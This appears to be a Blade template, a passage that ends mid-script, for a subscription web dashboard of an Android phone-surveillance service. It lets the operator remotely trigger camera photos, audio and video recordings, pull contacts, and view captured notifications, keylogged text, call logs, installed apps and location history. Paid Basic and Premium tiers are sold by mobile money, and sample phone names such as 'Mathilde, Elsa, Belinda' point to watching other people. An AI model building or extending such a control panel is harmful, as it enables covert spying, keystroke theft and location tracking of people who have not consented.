@extends('layouts.main')
@section('title', 'Controle à distance')

@section('body')
    <x-sidebar />
    <x-nav />

    <div class="mdb-page-content page-intro bg-white">
        <div class="container py-3 ">
            <div class="row">
                <div class="col-md-12 mt-5">
                    @if (count($phones))
                        <div class="card shadow-lg mb-3 mt-5" style="border-radius: 20px; background-color: whitesmoke;">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-3">
                                        <div class="row no-gutters">
                                            <div class="col">
                                                <div class="mb-2">
                                                    <b>Téléphone</b> <br>
                                                    <select name="phone_id"
                                                        class="form-control form-control-sm select2 input"
                                                        style="width: 100%">
                                                        @foreach ($phones as $el)
                                                            <option value="{{ $el->id }}">{{ $el->phone }}</option>
                                                        @endforeach
                                                    </select>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row no-gutters">
                                            <div class="col">
                                                <button class="btn btn-sm btn-white my-2 mb-3 btn-rounded"
                                                    data-toggle="modal" data-target="#mdltel">
                                                    <i class="fa fa-phone"></i>
                                                    Ajouter un téléphone
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-9 d-flex justify-content-lg-end justify-content-md-end">
                                        <div class="" style="font-size: 12px">
                                            <h4 class="font-weight-bold text-dark"><i class="fa fa-money-bill"></i> Mon
                                                abonnement
                                            </h4>
                                            <div class="mt-2" divab>
                                                <div class="d-flex justify-content-between">
                                                    <b>Téléphone : </b>
                                                    <b abphone></b>
                                                </div>
                                                <div class="d-flex justify-content-between" abphonename>
                                                </div>
                                                <div class="d-flex justify-content-between">
                                                    <b>Status abonnement : </b>
                                                    <b abstatus></b>
                                                </div>
                                                <div class="d-flex justify-content-between">
                                                    <b>Type abonnement : </b>
                                                    <b abtype></b>
                                                </div>
                                                <div class="d-flex justify-content-between">
                                                    <b>Expire au : </b>
                                                    <b abto></b>
                                                </div>
                                                <div class="d-flex justify-content-between">
                                                    <b>Jours restants : </b>
                                                    <b abdl></b>
                                                </div>

                                                <div class="my-3 d-flex justify-content-between">
                                                    <div class="">
                                                        <button btninfo class="btn app-btn btn-rounded btn-sm input">
                                                            <i class="fa fa-info-circle"></i>
                                                        </button>
                                                    </div>
                                                    <div class="">
                                                        <button btnpay class="btn btn-danger btn-rounded btn-sm input">
                                                            <i class="fa fa-money-bill-transfer"></i>
                                                            Payer un abonnement
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="text-center">
                                    <small class=" font-weight-bold text-danger" style="font-size: 12px">
                                        <i class="fa fa-trash"></i> Attention : toutes les données qui datent de plus de 7
                                        jours
                                        sont supprimées automatiquement.
                                    </small>
                                </div>
                            </div>
                        </div>
                    @endif
                    @if (count($phones))
                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <div class="">
                                    <h4 class="font-weight-bold"> <i class="fa fa-phone"></i> <span phonename></span>
                                        <button class="btn btn-sm shadow-md btn-rounded input m-0" id="btneditphone">
                                            <i class="fa fa-edit"></i>
                                        </button>
                                    </h4>
                                    <span phonename2></span>
                                </div>
                            </div>
                            <div class="card-body">
                                <p class="m-1">
                                    <i class="fa fa-check-circle"></i> Date synchronisation : <span updatedon></span>
                                </p>
                                <p class="m-1">
                                    <i class="fa fa-leaf"></i> Version App : <span appversion></span>
                                </p>
                                <p class="m-1">
                                    <i class="fa fa-battery"></i> Batterie : <span battery></span>
                                </p>
                                <p class="m-1">
                                    <i class="fa fa-mobile-android-alt"></i> Android : <span android_version></span>
                                </p>
                                <p class="m-1"><i class="fa fa-refresh"></i> FCM : <span fcm></span> </p>
                                <p class="m-1"><i class="fa fa-check-circle"></i> Permissions : <span perms></span> </p>
                            </div>
                        </div>
                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <div class="d-flex flex-wrap justify-content-between align-items-center">
                                    <h4 class="font-weight-bold"> <i class="fa fa-wifi"></i> Contrôle à distance</h4>
                                    <div class="d-flex flex-column flex-sm-row flex-wrap">
                                        <div class="mb-2 mb-sm-0 mr-sm-2">
                                            <b class="text-danger">Actions quotidiennes restantes :
                                                <span remainaction></span>
                                            </b>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="card-body">
                                <p class="text-muted">
                                    <i class="fa fa-info-circle"></i>
                                    Utiliser la fonctionnalité « Contrôle à distance » pour envoyer les commandes à votre
                                    téléphone et récupérer les résultats.
                                </p>
                                <div class="my-3">
                                    <button class="btn btn-danger btn-rounded btn-sm" btnresetaction style="display: none">
                                        <i class="fa fa-refresh"></i>
                                        Réinitialiser les actions quotidiennes
                                    </button>
                                </div>
                                <div class="row">
                                    <div class="col-md-3 col-lg-3 col-md-6">
                                        <form action="#" f-action>
                                            <div class="card shadow-lg mb-3">
                                                <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                    <b><i class="fa fa-camera-alt"></i> Prendre une photo</b>
                                                    <div class="flex-fill d-flex align-items-center">
                                                        <div class="">
                                                            <div class="form-check form-check-inline">
                                                                <input class="form-check-input" type="radio"
                                                                    name="camera" id="inlineRadiop0" value="1"
                                                                    checked />
                                                                <label class="form-check-label" for="inlineRadiop0">
                                                                    Caméra Avant</label>
                                                            </div>
                                                            <div class="form-check form-check-inline">
                                                                <input class="form-check-input" type="radio"
                                                                    name="camera" id="inlineRadipv01" value="0" />
                                                                <label class="form-check-label"
                                                                    for="inlineRadipv01">Caméra
                                                                    Arrière</label>
                                                            </div>
                                                            <div class="mt-2 mb-2">
                                                                <div class="form-check">
                                                                    <input class="form-check-input" type="checkbox"
                                                                        name="flash" id="checkboxExample">
                                                                    <label class="form-check-label" for="checkboxExample">
                                                                        Utiliser le flash
                                                                    </label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="alert" style="display: none;padding: 5px;"
                                                        id="repaction">
                                                    </div>
                                                    <input type="hidden" name="action" value="photo">
                                                    <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                        <i class="fa fa-envelope"></i>
                                                        Envoyer
                                                    </button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                    <div class="col-md-3 col-lg-3 col-md-6">
                                        <form action="#" f-action>
                                            <div class="card shadow-lg mb-3">
                                                <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                    <b><i class="fa fa-microphone"></i> Enregistrer un audio</b>
                                                    <div class="flex-fill d-flex align-items-center">
                                                        <div class="w-100 mb-2">
                                                            <span>Durée de l'audio</span><br>
                                                            <select class="select2" name="minute" style="width: 100%;">
                                                                <option value="1">1 minute</option>
                                                                <option value="3">3 minutes</option>
                                                                <option value="5">5 minutes</option>
                                                                <option value="10">10 minutes</option>
                                                                <option value="20">20 minutes</option>
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="alert" style="display: none;padding: 5px;"
                                                        id="repaction">
                                                    </div>
                                                    <input type="hidden" name="action" value="audio">
                                                    <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                        <i class="fa fa-envelope"></i>
                                                        Envoyer
                                                    </button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                    <div class="col-md-3 col-lg-3 col-md-6">
                                        <form action="#" f-action>
                                            <div class="card shadow-lg mb-3">
                                                <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                    <b><i class="fa fa-video"></i> Enregistrer une vidéo</b>
                                                    <div class="flex-fill d-flex align-items-center">
                                                        <div class="">
                                                            <div class="form-check form-check-inline">
                                                                <input class="form-check-input" type="radio"
                                                                    name="camera" id="inlineRadiov0" value="1"
                                                                    checked />
                                                                <label class="form-check-label" for="inlineRadiov0">
                                                                    Caméra Avant</label>
                                                            </div>
                                                            <div class="form-check form-check-inline">
                                                                <input class="form-check-input" type="radio"
                                                                    name="camera" id="inlineRadiov01" value="0" />
                                                                <label class="form-check-label"
                                                                    for="inlineRadiov01">Caméra
                                                                    Arrière</label>
                                                            </div>
                                                            <div class="mt-2 mb-2">
                                                                <span>Durée de la vidéo</span><br>
                                                                <select class="select2" name="minute"
                                                                    style="width: 100%;">
                                                                    <option value="1">1 minute</option>
                                                                    <option value="3">3 minutes</option>
                                                                    <option value="5">5 minutes</option>
                                                                    <option value="10">10 minutes</option>
                                                                    <option value="20">20 minutes</option>
                                                                </select>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="alert" style="display: none;padding: 5px;"
                                                        id="repaction">
                                                    </div>
                                                    <input type="hidden" name="action" value="video">
                                                    <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                        <i class="fa fa-envelope"></i>
                                                        Envoyer
                                                    </button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                    <div class="col-md-3 col-lg-3 col-md-6">
                                        <form action="#" f-action>
                                            <div class="card shadow-lg mb-3">
                                                <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                    <b><i class="fa fa-contact-book"></i> Récupérer les contacts</b>
                                                    <div class="flex-fill d-flex text-center align-items-center">
                                                        <p>
                                                            <i class="fa fa-info-circle"></i>
                                                            Utilisez cette commande pour récupérer la liste de tous les
                                                            contacts
                                                            du
                                                            téléphone.
                                                        </p>
                                                    </div>
                                                    <input type="hidden" name="action" value="c">
                                                    <div class="alert" style="display: none;padding: 5px;"
                                                        id="repaction">
                                                    </div>
                                                    <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                        <i class="fa fa-envelope"></i>
                                                        Envoyer
                                                    </button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <div class="col-12">
                                    <h4 class="font-weight-bold mb-2 mt-5"> <i class="fa fa-sync"></i> Resultats des
                                        commandes
                                    </h4>
                                    <p class="text-muted mb-5">
                                        <i class="fa fa-info-circle"></i>
                                        Les résultats de vos commandes s'afficheront ici avec leurs états
                                    </p>
                                    <div class="table-responsive">
                                        <x-error />
                                        <table tresult class="table table-sm table-condensed table-hover table-striped"
                                            style="width: 100%">
                                            <thead>
                                                <th>ID</th>
                                                <th>Action</th>
                                                <th>Etat</th>
                                                <th>Date</th>
                                                <th>Resultat</th>
                                            </thead>
                                            <tbody></tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <div class="d-flex flex-wrap justify-content-between align-items-center">
                                    <h4 class="font-weight-bold text-nowrap"> <i class="fa fa-bell"></i> Notifications
                                    </h4>
                                    <div class="d-flex flex-column flex-sm-row flex-wrap">
                                        <div class="mb-2 mb-sm-0 mr-sm-2">
                                            <span>Apps</span> <br>
                                            <select id="phoneapps" multiple
                                                class="form-control form-control-sm select2 input notif-input"
                                                style="width: 100%;">
                                            </select>
                                        </div>
                                        <div class="mb-2 mb-sm-0 mr-sm-2">
                                            <span>Date</span>
                                            <input type="text"
                                                class="form-control form-control-sm flatpicker input notif-input"
                                                id="notificationdate" value="{{ date('Y-m-d') }}">
                                        </div>
                                    </div>
                                </div>
                                <p class="text-muted mb-2">
                                    <i class="fa fa-info-circle"></i>
                                    Toutes les notifications capturées par l'application seront enregistrées ici.
                                </p>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <x-error />
                                    <table tnotif class="table table-sm table-condensed table-hover table-striped"
                                        style="width: 100%">
                                        <thead>
                                            <th>ID</th>
                                            <th>App</th>
                                            <th>Titre</th>
                                            <th>Notification</th>
                                            <th>Date</th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <div class="d-flex flex-wrap justify-content-between align-items-center">
                                    <h4 class="font-weight-bold"> <i class="fa fa-keyboard"></i> Key logger</h4>
                                    <div class="d-flex flex-column flex-sm-row flex-wrap">
                                        <div class="mb-2 mb-sm-0 mr-sm-2">
                                            <span>Date</span>
                                            <input type="text" class="form-control form-control-sm flatpicker input"
                                                id="keyloggerdate" value="{{ date('Y-m-d') }}">
                                        </div>
                                    </div>
                                </div>
                                <p class="text-muted mb-2 mt-1">
                                    <i class="fa fa-info-circle"></i>
                                    Tous les textes saisis dans les champs des formulaires de certaines applications
                                    s'afficheront ici et même certains textes des fenêtres des applications ouvertes.
                                </p>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <x-error />
                                    <table tkeylogger class="table table-sm table-condensed table-hover table-striped"
                                        style="width: 100%">
                                        <thead>
                                            <th>ID</th>
                                            <th>App</th>
                                            <th>Text</th>
                                            <th>Date</th>
                                            <th></th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <div class="card mb-3 shadow-md">
                            <div class="card-header ">
                                <div class="d-flex flex-wrap justify-content-between align-items-center">
                                    <h4 class="font-weight-bold"> <i class="fa fa-phone-square"></i> Appels</h4>
                                    <div class="d-flex flex-column flex-sm-row flex-wrap">
                                        <div class="mb-2 mb-sm-0 mr-sm-2">
                                            <span>Date</span>
                                            <input type="text" class="form-control form-control-sm flatpicker input"
                                                id="calldate" value="{{ date('Y-m-d') }}">
                                        </div>
                                    </div>
                                </div>
                                <p class="text-muted mb-2">
                                    <i class="fa fa-info-circle"></i>
                                    L'historique de tous les appels
                                </p>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <x-error />
                                    <table tcalls class="table table-sm table-condensed table-hover table-striped"
                                        style="width: 100%">
                                        <thead>
                                            <th>ID</th>
                                            <th>Type</th>
                                            <th>Nom</th>
                                            <th>Numero</th>
                                            <th>Temps</th>
                                            <th>Date</th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <h4 class="font-weight-bold"> <i class="fa fa-list-ul"></i> Apps</h4>
                                <p class="text-muted mb-2">
                                    <i class="fa fa-info-circle"></i>
                                    La liste d'applications installées sur le téléphone
                                </p>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <x-error />
                                    <table tapps class="table table-sm table-condensed table-hover table-striped"
                                        style="width: 100%">
                                        <thead>
                                            <th>ID</th>
                                            <th>App</th>
                                            <th>Package</th>
                                            <th>Date installation</th>
                                            <th>Etat</th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <div class="card mb-3 shadow-md">
                            <div class="card-header ">
                                <div class="d-flex flex-wrap justify-content-between align-items-center">
                                    <h4 class="font-weight-bold"> <i class="fa fa-map-location"></i> Localisation</h4>
                                    <div class="d-flex flex-column flex-sm-row flex-wrap">
                                        <div class="mb-2 mb-sm-0 mr-sm-2">
                                            <span>Date</span>
                                            <input type="text" class="form-control form-control-sm flatpicker input"
                                                id="locationdate" value="{{ date('Y-m-d') }}">
                                        </div>
                                    </div>
                                </div>
                                <p class="text-muted mb-2">
                                    <i class="fa fa-info-circle"></i>
                                    L'historique de localisation
                                </p>
                            </div>
                            <div class="card-body">
                                <div id="map" class="m-2 rounded-lg"></div>
                            </div>
                        </div>
                    @else
                        <div class="card shadow-lg mt-5">
                            <div class="card-body d-flex justify-content-center align-items-center"
                                style="min-height: 60vh">
                                <div class="text-center">
                                    <h5 class="font-weight-bold text-danger">
                                        <i class="fa fa-phone-slash"></i> Aucun téléphone
                                    </h5>
                                    <div class="mt-3">
                                        <b>
                                            Veuillez ajouter au moins un téléphone pour commencer la surveillance à
                                            distance.
                                        </b>
                                    </div>
                                    <div class="mt-3">
                                        <button class="btn btn-sm app-btn mt-2 btn-rounded" data-toggle="modal"
                                            data-target="#mdltel">
                                            <i class="fa fa-phone"></i>
                                            Ajouter un téléphone
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    @endif
                </div>

            </div>
        </div>
        <x-footer />

        <div class="modal fade" id="minfo" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title text-dark font-weight-bold">Key logger : <span appname></span> </h5>
                        <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                    </div>
                    <div class="modal-body" style="max-height: 60vh; overflow:auto;">

                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-rounded btn-sm"
                            data-dismiss="modal">Fermer</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="mdltel" tabindex="-1" aria-hidden="true" data-backdrop="static">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title text-dark font-weight-bold">Comment ajouter un téléphone ? </h5>
                        <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                    </div>
                    <div class="modal-body" style="max-height: 60vh; overflow:auto;">

                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-rounded btn-sm"
                            data-dismiss="modal">Fermer</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="mdleditphone" tabindex="-1" aria-hidden="true" data-backdrop="static">
            <div class="modal-dialog modal-md">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title text-dark font-weight-bold">Modifier le nom du téléphone</h5>
                        <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                    </div>
                    <div class="modal-body">
                        <form action="#" f-edit>
                            <input type="hidden" name="phone_id">
                            <input type="hidden" name="action" value="setphonename">
                            <div class="form-outline mb-4">
                                <input id="form1Example1" name="phone" disabled class="form-control" />
                                <label class="form-label" for="form1Example1">Téléphone</label>
                            </div>
                            <div class="form-outline mb-4">
                                <input id="form1Example1" name="name" required class="form-control" />
                                <label class="form-label" for="form1Example1">Nom du Téléphone</label>
                            </div>
                            <p class="text-muted m-0">Ex: Mathilde, Elsa, Belinda</p>
                            <div id="rep" class="my-2" style="padding: 5px"></div>
                            <button class="btn btn-rounded app-btn btn-sm">
                                <i class="fa fa-save"></i> Enregistrer
                            </button>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-rounded btn-sm" data-dismiss="modal">Fermer</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="mdlpay" tabindex="-1" aria-hidden="true" data-backdrop="static">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title text-dark font-weight-bold">Paiement abonnement </h5>
                        <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                    </div>
                    <div class="modal-body">
                        <form action="#" f-pay>
                            <input type="hidden" name="phone_id">
                            <input type="hidden" name="action" value="subscription">
                            <div class="text-center">
                                <small>Abonnement pour </small>
                                <h5 class="font-weight-bold text-dark" payphone></h5>
                            </div>
                            <div class="">
                                <b class="">Type d'abonnement</b>
                                <div class="my-3">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="subtype" id="subip"
                                            value="basic" checked />
                                        <label class="form-check-label text-success" for="subip">
                                            <i class="fa fa-check-circle"></i> Basic
                                        </label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="radio" name="subtype" id="subpi0"
                                            value="premium" />
                                        <label class="form-check-label text-danger" for="subpi0">
                                            <i class="fa fa-crown"></i> Premium
                                        </label>
                                    </div>
                                </div>
                                <div id="basicinfo" style="display: none">
                                    <p class="font-weight-bold mb-1">Grâce à l'abonnement BASIC, vous avez :</p>
                                    <ul class="list-unstyled">
                                        <li> <i class="fa fa-check-circle text-primary"></i> 30 Actions quotidiennes</li>
                                        <li> <i class="fa fa-check-circle text-primary"></i> Accès aux 50 premières
                                            notifications</li>
                                        <li> <i class="fa fa-check-circle text-primary"></i> Accès à l'historique de 10
                                            premiers appels</li>
                                        <li> <i class="fa fa-check-circle text-primary"></i> Accès à l'historique de
                                            localisation de 00h jusqu'à 12h</li>
                                        <li> <i class="fa fa-check-circle text-primary"></i> Accès au Key logger de 00h à
                                            12h</li>
                                    </ul>
                                </div>
                                <div id="premiuminfo" style="display: none">
                                    <p class="font-weight-bold mb-1">
                                        Grâce à l'abonnement PREMIUM, vous avez un accès quotidien
                                        <b class="text-danger">ILLIMITÉ</b> à toutes les fonctionnalité !
                                    </p>
                                </div>
                            </div>
                            <div class="w-100 text-center my-2" ldr style="display: none">
                                <i class="spinner-border spinner-border-sm"></i>
                            </div>
                            <div class="my-3">
                                <div class="text-center">
                                    <b class="mr-2">Nous acceptons les paiements par </b>
                                </div>
                                <div class="d-flex justify-content-center">
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/airtel.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/vodacom.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/orange.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/afrimoney.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                </div>
                            </div>
                            <b class="my-2">Montant de l'abonnement : <span subamount style="font-size: 28px"></span>
                                <i>pour 30 jours</i>
                            </b>
                            <div class="form-group mb-3">
                                <label for="">Je paie en</label>
                                <select name="devise" id="" class="form-control">
                                    <option>CDF</option>
                                    <option selected>USD</option>
                                </select>
                            </div>
                            <div class="form-outline mb-3">
                                <input id="paymt" readonly class="form-control" value="0" />
                                <label class="form-label" for="paymt">Montant Paiement</label>
                            </div>

                            <div class="form-outline mb-4 input-group flex-nowrap">
                                <span class="input-group-text" id="addon-wrapping">+243</span>
                                <input required class="form-control" required pattern="[0-9.]+" minlength="9"
                                    maxlength="9" name="phone" />
                                <label class="form-label">Téléphone Mobile Money</label>
                            </div>
                            <div class="mt-3 mb-3">
                                <div id="rep"></div>
                            </div>
                            <button class="btn btn-sm app-btn btn-block btn-rounded" type="submit">
                                <span></span>
                                Payer
                            </button>
                            <button type="button" class="btn btn-light btn-block btn-rounded my-2" btncancel
                                style="display: none">Annuler
                            </button>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-rounded btn-sm"
                            data-dismiss="modal">Fermer</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="mdlpay2" tabindex="-1" aria-hidden="true" data-backdrop="static">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title text-dark font-weight-bold">Réinitialisation des actions</h5>
                        <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                    </div>
                    <div class="modal-body">
                        <form action="#" f-pay2>
                            <input type="hidden" name="phone_id">
                            <input type="hidden" name="action" value="reset">
                            <div class="text-center">
                                <small>Réinitialiser pour </small>
                                <h5 class="font-weight-bold text-dark" payphone></h5>
                            </div>
                            <p class="font-weight-bold my-3">Si vous avez besoin de plus d'actions quotidiennes, la
                                réinitialisation des actions quotidiennes vous permet de remettre le compteur à 0
                                afin de vous permettre d'envoyer les commandes à votre téléphone.
                            </p>
                            <div class="w-100 text-center my-2" ldr style="display: none">
                                <i class="spinner-border spinner-border-sm"></i>
                            </div>
                            <div class="my-3">
                                <div class="text-center">
                                    <b class="mr-2">Nous acceptons les paiements par </b>
                                </div>
                                <div class="d-flex justify-content-center">
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/airtel.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/vodacom.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/orange.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                    <a class="m-1">
                                        <img class="img-thumbnail shadow-lg"
                                            src="{{ asset('img/payment-method/afrimoney.png') }}" width="100px"
                                            height="50px" alt="" />
                                    </a>
                                </div>
                            </div>
                            <b class="my-2">Montant de paiement : <span subamount style="font-size: 28px"></span>
                            </b>
                            <div class="form-group mb-3">
                                <label for="">Je paie en</label>
                                <select name="devise" id="" class="form-control">
                                    <option>CDF</option>
                                    <option selected>USD</option>
                                </select>
                            </div>
                            <div class="form-outline mb-3">
                                <input id="paymt" readonly class="form-control" value="0" />
                                <label class="form-label" for="paymt">Montant Paiement</label>
                            </div>

                            <div class="form-outline mb-4 input-group flex-nowrap">
                                <span class="input-group-text" id="addon-wrapping">+243</span>
                                <input required class="form-control" required pattern="[0-9.]+" minlength="9"
                                    maxlength="9" name="phone" />
                                <label class="form-label">Téléphone Mobile Money</label>
                            </div>
                            <div class="mt-3 mb-3">
                                <div id="rep"></div>
                            </div>
                            <button class="btn btn-sm app-btn btn-block btn-rounded" type="submit">
                                <span></span>
                                Payer
                            </button>
                            <button type="button" class="btn btn-light btn-block btn-rounded my-2" btncancel
                                style="display: none">Annuler
                            </button>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-rounded btn-sm"
                            data-dismiss="modal">Fermer</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="mdlinfo" tabindex="-1" aria-hidden="true" data-backdrop="static">
            <div class="modal-dialog modal-md">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title text-dark font-weight-bold">Avec votre abonnement actuelle, vous avez </h5>
                        <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                    </div>
                    <div class="modal-body">
                        <form action="#" f-info>
                            <div class="w-100 text-center my-2" ldr style="display: none">
                                <i class="spinner-border spinner-border-lg"></i>
                            </div>
                            <div id="resinfo"></div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-rounded btn-sm" data-dismiss="modal">Fermer</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection

@section('js-code')
    @include('files.datatable-js')
    @include('files.flatpickr')
    @include('files.select')

    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin="" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet-gesture-handling/dist/leaflet-gesture-handling.min.css">
    <script src="https://unpkg.com/leaflet-gesture-handling"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.css" />
    <script src="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/leaflet-polylinedecorator@1.6.0/dist/leaflet.polylineDecorator.min.js">
    </script>

    <style>
        #map {
            height: 400px;
        }

        .select2-container .select2-selection--multiple {
            min-width: 200px;
        }

        .ellipsis {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 200px;
            cursor: pointer;
        }
    </style>
    @if (count($phones))
        <script>
            $(function() {
                var mindate = "{{ now()->subDays(7)->format('Y-m-d') }}";
                flatpickr(".flatpicker", {
                    mode: "range",
                    minDate: mindate,
                    maxDate: "today",
                    locale: {
                        firstDayOfWeek: 1
                    }
                });
                $('.select2').select2({
                    minimumResultsForSearch: Infinity
                });

                var phonesel = $('[name="phone_id"]');

                $('.notif-input').change(function() {
                    dtNotif.ajax.reload(null, false);
                });

                var keyloggerdate = $('#keyloggerdate');
                keyloggerdate.change(function() {
                    dtKeylogger.ajax.reload(null, false);
                });

                var calldate = $('#calldate');
                calldate.change(function() {
                    dtCalls.ajax.reload(null, false);
                });

                var locationdate = $('#locationdate');
                locationdate.change(function() {
                    location(false);
                });

                phonesel.change(function() {
                    getphoneapps();
                });

                var btneditphone = $('#btneditphone');
                btneditphone.click(function() {
                    var data = $(this).attr('data');
                    data = JSON.parse(data);
                    var form = $('[f-edit]');
                    $('[name="phone"]').val(data.phone);
                    $('[name="name"]').val(data.name);
                    $('[name="phone_id"]').val(data.id);
                    new mdb.Modal($('#mdleditphone')[0]).show();
                });

                function reloadAll() {
                    dtResult.ajax.reload(null, false);
                    dtNotif.ajax.reload(null, false);
                    dtKeylogger.ajax.reload(null, false);
                    dtCalls.ajax.reload(null, false);
                    dtApps.ajax.reload(null, false);
                }

                function phoneStatus(phone) {
                    if (!phone) return;
                    btneditphone.attr('data', JSON.stringify(phone));
                    $('[updatedon]').html(phone.updatedon);
                    $('[appversion]').html(phone.data.appversion);
                    var sn = phone.name ?
                        `<small style='font-size:12px'><i class='fa fa-user-alt'></i> ${phone.name}</small>` : '';
                    $('[phonename]').html(phone.phone);
                    $('[phonename2]').html(sn);
                    $('[battery]').html(phone.data.battery);
                    $('[android_version]').html(phone.data.android_version);
                    $('[fcm]').html(phone.fcm ? "<i class='fa fa-check-circle text-success'></i>" :
                        "<i class='text-danger fa fa-times-circle'></i>");
                    var perms = Object.keys(phone.perms);
                    var p = [];
                    perms.forEach(e => {
                        p.push(
                            `${e} : ${phone.perms[e] ?  "<i class='fa fa-check-circle text-success'></i>" :"<i class='text-danger fa fa-times-circle'></i>"}`
                        );
                    });
                    $('[perms]').html(p.join(' | '));
                    var subscription = phone.subscription;
                    var as = subscription.active ?
                        '<span class="badge bg-success"><i class="fa fa-check-circle"></i> ACTIF</span>' :
                        '<span class="badge bg-danger"><i class="fa fa-ban"></i> NON ACTIF</span>';
                    $('[abstatus]').html(as);
                    $('[abphone]').html(subscription.phone);
                    $('[abphonename]').html('');
                    if (subscription.phonename) {
                        $('[abphonename]').html(`<b>Nom téléphone :</b><b>${subscription.phonename}</b>`);
                    }
                    $('[abtype]').html(subscription.type);
                    $('[abto]').html(subscription.to);
                    $('[abdl]').html(subscription.daysleft);
